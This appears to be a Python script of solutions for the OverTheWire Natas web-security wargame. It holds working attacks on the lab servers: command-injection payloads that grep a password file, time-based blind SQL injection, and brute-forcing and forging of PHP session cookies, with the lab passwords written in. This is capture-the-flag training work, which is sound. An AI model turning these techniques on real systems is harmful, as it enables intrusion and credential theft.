import base64


def level11():
    key = b"\x71\x77\x38\x4a"
    base = b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'

    unbase = base64.b64decode(base)
    unxored = bytearray()

    i = 0
    for x in unbase:
        mutation = key[i % len(key)]
        unxored.append(x ^ mutation)
        i += 1

    print("Decoding...")

    message = unxored.decode("utf-8")
    print("Message: " + message)
    new_message = message.replace('"no"', '"yes"')
    print("New message: " + new_message)

    new_unxored = bytearray(new_message.encode("utf-8"))
    new_xored = bytearray()

    i = 0
    for x in new_unxored:
        mutation = key[i % len(key)]
        new_xored.append(x ^ mutation)
        i += 1
    print("Re-encoding")
    print(base64.b64encode(new_xored).decode("utf-8"))

    return True


def level16():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
    searchstring = 'doomed'
    payload = {'needle': searchstring}

    allchars = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"
    usedchars = ''

    password = ''
    direction = 'pre'
    found = 0

    for char in allchars:
        payload['needle'] = searchstring + '$(grep ' + char + ' /etc/natas_webpass/natas17)'
        r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?develop=1', params=payload,
                         auth=credentials)
        if not r.text.__contains__(searchstring):
            usedchars += char

    while len(password) < 32:
        for char in usedchars:
            found = 0
            if direction == 'pre':
                tmp = char + password
            else:
                tmp = password + char
            payload['needle'] = searchstring + '$(grep ' + tmp + ' /etc/natas_webpass/natas17)'
            r = requests.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload, auth=credentials)
            if not r.text.__contains__(searchstring):
                found += 1
                password = tmp
                print("Direction: " + direction + "     , current pw: " + password)
                break
        if found == 0:
            if direction == 'pre':
                direction = 'post'
            else:
                direction = 'pre'

    print("Znalazłam hasło: " + password)
    return True


def level17():
    import requests
    from requests.auth import HTTPBasicAuth
    import time

    credentials = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
    searchstring = 'doomed'
    payload = {'username': searchstring}

    allchars = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"

    password = ''
    found = 0
    i = 0

    # TODO We can improve this code by detecting first all used chars in password, then loop through this chars only.
    while len(password) < 32:
        for char in allchars:
            found = 0
            payload['username'] = 'natas18" AND password COLLATE latin1_bin like "' \
                                  + password + char + '%" and SLEEP(5) #'

            start = time.perf_counter()
            r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?debug=1', params=payload,
                             auth=credentials)
            end = time.perf_counter()

            if end - start > 4:
                password += char
                found += 1
                print("i: " + str(i) + "       found pw: " + password)
                time.sleep(5)
                break
        if found == 0:
            print('NOTHING FOUND FOR ' + password)
        i += 1

    print("Znalazłam hasło: " + password)
    return True


def level18():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

    for i in range(0, 1000):
        cookie = {"PHPSESSID": str(i)}
        r = requests.get('http://natas18.natas.labs.overthewire.org/index.php', cookies=cookie, auth=credentials)
        if r.text.__contains__("You are logged in as a regular user"):
            print("false: " + cookie.get("PHPSESSID"))
        else:
            print("SUCCESS PHPSESSID = " + cookie.get("PHPSESSID"))
            print(r.text)
            break
    return True


def level19():
    import requests
    from requests.auth import HTTPBasicAuth

    credentials = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

    for i in range(1, 1000):
        identifier = ''
        for symbol in str(i):
            identifier += format(ord(symbol), "x")
        cookie = {"PHPSESSID": identifier + "2d61646d696e"}
        print(identifier)
        r = requests.get('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookie, auth=credentials)
        if r.text.__contains__("You are logged in as a regular user"):
            print("false: " + cookie.get("PHPSESSID"))
        else:
            print("SUCCESS PHPSESSID = " + cookie.get("PHPSESSID"))
            print(r.text)
            break
    return True


def main():
    levels = ('11', '16', '17', '18', '19')

    print("Hi there!\n"
          "you've just run natas (http://overthewire.org/wargames/natas/) levels solutions. Not every level\n"
          "require a python solution, so this app will not help you with all of them. Anyway enjoy our stay.\n")

    print("Available levels solutions: " + str(levels).strip(' ()').replace("'", ""))
    level = input("Pick level to solve: ")
    level = level.lower().strip()

    if level == 'q':
        return 0

    if level in levels:
        if level == '11':
            level11()
        if level == '16':
            level16()
        if level == '17':
            level17()
        if level == '18':
            level18()
        if level == '19':
            level19()
    else:
        print("Hey! There is no such level. Bye bye!")


if __name__ == '__main__':
    main()